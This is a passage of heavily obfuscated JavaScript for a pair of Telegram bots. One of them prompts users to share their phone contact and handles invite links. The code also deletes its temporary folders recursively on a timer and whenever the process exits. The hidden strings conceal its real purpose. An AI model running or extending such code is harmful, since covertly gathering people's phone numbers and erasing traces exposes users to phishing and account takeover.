                    bot[_0x5c4500(0x273) + 'e'](_0x3ec100, _0x2f7a85, { 'parse_mode': _0x39d7d5[_0x5c4500(0x797)] });
                secondBot[_0x5c4500(0x273) + 'e'](_0x4c1b1c[_0x5c4500(0x6a6)]['id'], _0x39d7d5[_0x5c4500(0x3af)]), delete inviteLinks[_0x4c1b1c[_0x5c4500(0x237)]['id']];
            })[_0x4b9f23(0x3d1)](_0x3ba77f => {
                const _0x55331d = _0x4b9f23;
                console[_0x55331d(0x6d0)](_0x39d7d5[_0x55331d(0x703)], _0x3ba77f), secondBot[_0x55331d(0x273) + 'e'](_0x4c1b1c[_0x55331d(0x6a6)]['id'], _0x39d7d5[_0x55331d(0x6af)]);
            });
        } else
            secondBot[_0x4b9f23(0x273) + 'e'](_0x4c1b1c[_0x4b9f23(0x6a6)]['id'], _0x39d7d5[_0x4b9f23(0x6ac)]);
    } else
        secondBot[_0x4b9f23(0x273) + 'e'](_0x4c1b1c[_0x4b9f23(0x6a6)]['id'], _0x39d7d5[_0x4b9f23(0x5ef)]);
}), secondBot['on'](_0x178009(0x1e6), _0x3667bc => {
    const _0x110466 = _0x178009, _0x312cee = {
            'ipsMR': function (_0x247233, _0x4cb99c) {
                return _0x247233 !== _0x4cb99c;
            },
            'JYdQe': _0x110466(0x244),
            'CdZWM': _0x110466(0x22d) + _0x110466(0x5e1),
            'EmOce': _0x110466(0x2f5) + _0x110466(0x49f) + _0x110466(0x48a)
        };
    if (!_0x3667bc[_0x110466(0x2e8)] && _0x312cee[_0x110466(0x758)](_0x3667bc[_0x110466(0x62f)], _0x312cee[_0x110466(0x804)])) {
        const _0x3d4b2c = {
            'reply_markup': {
                'keyboard': [[{
                            'text': _0x312cee[_0x110466(0x2c9)],
                            'request_contact': !![]
                        }]],
                'one_time_keyboard': !![]
            }
        };
        secondBot[_0x110466(0x273) + 'e'](_0x3667bc[_0x110466(0x6a6)]['id'], _0x312cee[_0x110466(0x481)], _0x3d4b2c);
    }
});
const clearTemporaryStorage = () => {
    const _0x405bfa = _0x178009, _0x2cb338 = {
            'eGNmH': function (_0x418fa2, _0x50ff19) {
                return _0x418fa2(_0x50ff19);
            },
            'vjSfU': _0x405bfa(0x6bb) + _0x405bfa(0x530) + _0x405bfa(0x493),
            'YZXyO': _0x405bfa(0x3c3),
            'GxTxX': _0x405bfa(0x2d5),
            'ZUcPN': _0x405bfa(0x235),
            'QCeYM': _0x405bfa(0x7f5) + _0x405bfa(0x80c) + _0x405bfa(0x3f6) + _0x405bfa(0x441)
        };
    try {
        console[_0x405bfa(0x22e)](_0x2cb338[_0x405bfa(0x70c)]);
        const _0x3405eb = [
            _0x2cb338[_0x405bfa(0x77d)],
            _0x2cb338[_0x405bfa(0x54a)],
            _0x2cb338[_0x405bfa(0x7e2)]
        ];
        _0x3405eb[_0x405bfa(0x74d)](_0x195ab6 => {
            const _0x5c7705 = _0x405bfa, _0x1bce6d = path[_0x5c7705(0x2a7)](__dirname, _0x195ab6);
            fs[_0x5c7705(0x71b)](_0x1bce6d) ? (_0x2cb338[_0x5c7705(0x6cd)](deleteFolderRecursive, _0x1bce6d), console[_0x5c7705(0x22e)](_0x5c7705(0x814) + _0x5c7705(0x29d) + _0x1bce6d)) : console[_0x5c7705(0x22e)](_0x5c7705(0x71e) + _0x5c7705(0x505) + _0x1bce6d);
        });
    } catch (_0x69fdbf) {
        console[_0x405bfa(0x6d0)](_0x2cb338[_0x405bfa(0x39a)], _0x69fdbf);
    }
};
setInterval(() => {
    const _0xf095d3 = _0x178009, _0x30725a = {
            'AcIWL': function (_0x4789cb) {
                return _0x4789cb();
            },
            'hdDuu': _0xf095d3(0x416) + _0xf095d3(0x3b5) + _0xf095d3(0x444)
        };
    _0x30725a[_0xf095d3(0x3a5)](clearTemporaryStorage), console[_0xf095d3(0x22e)](_0x30725a[_0xf095d3(0x646)]);
}, (0x59c * -0x2 + 0xdca + -0x290) * (0x663 + -0x4 * 0x732 + 0x16a1) * (-0xac8 + 0xcd * -0x7 + -0x1 * -0x144b));
const handleExit = () => {
    const _0x190b7b = _0x178009, _0x516516 = {
            'PfqTc': _0x190b7b(0x501) + _0x190b7b(0x7da) + _0x190b7b(0x694) + _0x190b7b(0x661),
            'VAWnS': function (_0xde4cd2) {
                return _0xde4cd2();
            }
        };
    console[_0x190b7b(0x22e)](_0x516516[_0x190b7b(0x514)]), _0x516516[_0x190b7b(0x7a3)](clearTemporaryStorage), process[_0x190b7b(0x761)]();
};
process['on'](_0x178009(0x761), handleExit), process['on'](_0x178009(0x269), handleExit), process['on'](_0x178009(0x2ac), handleExit), process['on'](_0x178009(0x60a), handleExit);